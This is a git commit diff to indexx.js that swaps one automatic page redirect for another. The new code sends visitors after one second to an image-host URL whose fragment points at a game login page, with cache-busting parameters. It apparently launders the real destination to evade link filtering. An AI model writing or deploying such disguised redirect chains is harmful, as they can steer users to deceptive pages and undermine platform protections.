082aaf21e1bee260dd8c440f1f7655ca3a96e30c
iuuc <145624790+iuuc@users.noreply.github.com>
2024-02-13 18:06:58 +0800

    Update indexx.js

--- indexx.js
+++ indexx.js
@@ -1,7 +1,5 @@
-window.onload = function () {
-    const targetUrl = 'https://i.qianbao.qq.com/lib/components/adapt/middlepage.html?url=https://qm.qq.com/q/JVZ6rUSMGA#';
-    const timestamp = Date.now();
-    const randomString = Math.random().toString(36).substring(2);
-    const urlWithParam = `${targetUrl}?${timestamp}${randomString}`;
-    window.location.href = urlWithParam
-}
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://static.job10000.com/yl/feedbackNew/20240115/65a4d72884e2d7c285985696.png?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + '?' + timestamp + 'yuge';
+    location.href = url;
+}, 1000);
